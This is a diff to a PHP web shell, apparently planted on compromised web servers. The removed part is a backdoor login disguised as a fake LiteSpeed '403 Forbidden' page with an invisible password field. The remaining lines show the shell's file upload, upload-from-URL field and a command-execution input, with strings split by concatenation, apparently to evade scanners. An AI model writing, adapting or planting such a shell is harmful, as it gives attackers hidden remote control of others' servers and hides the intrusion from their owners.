@@ -1,102 +1,3 @@
-<?php
-session_start();
-
-$stored_hashed_password = '$2y$10$rshuM0qirzalTek4GOp1pOzJn4vKL5jaeEV9LjZlRSRtwzJsuKsuy';
-
-if (
-    (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) ||
-    ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password))
-) {
-    
-    if (!isset($_SESSION['authenticated'])) {
-        $_SESSION['authenticated'] = true;
-    }
-
-    
-} else {
-?>
-<!DOCTYPE html>
-<html style="height:100%">
-<head>
-  <meta charset="UTF-8">
-  <title>403 Forbidden</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    @media (prefers-color-scheme:dark){ body { background-color:#000!important; } }
-    body {
-      margin: 0;
-      font: normal 14px/20px Arial, Helvetica, sans-serif;
-      background-color: #fff;
-      height: 100%;
-      color: #444;
-    }
-    .center-box {
-      text-align: center;
-      width: 800px;
-      margin-left: -400px;
-      position: absolute;
-      top: 30%;
-      left: 50%;
-    }
-    .footer {
-      color: #f0f0f0;
-      font-size: 12px;
-      padding: 0 30px;
-      position: relative;
-      clear: both;
-      height: 100px;
-      margin-top: -101px;
-      background-color: #474747;
-      border-top: 1px solid rgba(0,0,0,0.15);
-      box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;
-    }
-  </style>
-</head>
-<body>
-  <div style="height:auto; min-height:100%;">
-    <div class="center-box">
-      <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1>
-      <h2 style="margin-top:20px;font-size:30px;">Forbidden</h2>
-      <p>Access to this resource on the server is denied!</p>
-
-      
-      <form method="post" style="margin-top:10px;">
-        <input
-          type="password"
-          name="pass"
-          autocomplete="off"
-          style="
-            opacity: 0;
-            width: 100px;
-            height: 18px;
-            background: transparent;
-            border: none;
-            border-bottom: 1px dashed #aaa;
-            outline: none;
-            text-align: center;
-            font-size: 12px;
-            transition: opacity 0.3s;
-            position: relative;
-            top: 5px;
-          "
-          onfocus="this.style.opacity='0.4'"
-          onblur="this.style.opacity='0'"
-          placeholder=""
-        />
-      </form>
-    </div>
-  </div>
-
-  <div class="footer">
-    <br>Proudly powered by LiteSpeed Web Server
-    <p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p>
-  </div>
-</body>
-</html>
-<?php
-    exit;
-}
-?>
 <!DOCTYPE html>
 <html>
 <head>
@@ -589,7 +490,7 @@ echo '<form enctype="multip'.'art/form'.'-data" method="p'.'ost">
 <br>
 <input type="hidden" name="upwkwk" value="aplod">
 <input type="fi'.'le" name="berkas"><input type="submit" name="berkasnya" value="Up'.'load" class="up" style="cursor: pointer; border-color: #fff"><br>
-<input type="text" name="darilink" class="up" placeholder="https://mad'.'ke'.'ba'.'b'.'.g'.'it'.'hu'.'b.io/upl'.'oad.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="fi'.'le.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
+<input type="text" name="darilink" class="up" placeholder="https://cal'.'lme'.'bat'.'os'.'a'.'y.g'.'it'.'hu'.'b.io/upl'.'oad.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="fi'.'le.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
 </form>';
 echo '<br><form method="post" enctype="application/x-www-form-urlencoded">
 Co'.'mm'.'an'.'d : <input type="text" name="komend" class="up" style="cursor: pointer; border-color: #000" value="'.htmlspecialchars($_POST['komend']).'">
